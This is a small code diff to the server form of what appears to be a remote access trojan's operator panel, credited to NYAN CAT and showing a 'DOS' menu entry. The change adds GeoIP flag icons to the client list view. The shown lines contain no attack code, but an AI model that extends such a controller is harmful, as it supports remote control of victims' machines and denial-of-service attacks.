@@ -16,6 +16,7 @@ using Server.Helper;
 using System.Security.Cryptography.X509Certificates;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
+using cGeoIp;
 
 /* 
        │ Author       : NYAN CAT
@@ -31,6 +32,7 @@ namespace Server
     public partial class Form1 : Form
     {
         private bool trans;
+        public cGeoMain cGeoMain = new cGeoMain();
         private List<AsyncTask> getTasks = new List<AsyncTask>();
         private ListViewColumnSorter lvwColumnSorter;
 
@@ -44,6 +46,8 @@ namespace Server
                 Name = "DOS",
                 Text = "DOS",
             };
+            listView1.SmallImageList = cGeoMain.cImageList;
+            listView1.LargeImageList = cGeoMain.cImageList;
         }
 
         #region Form Helper
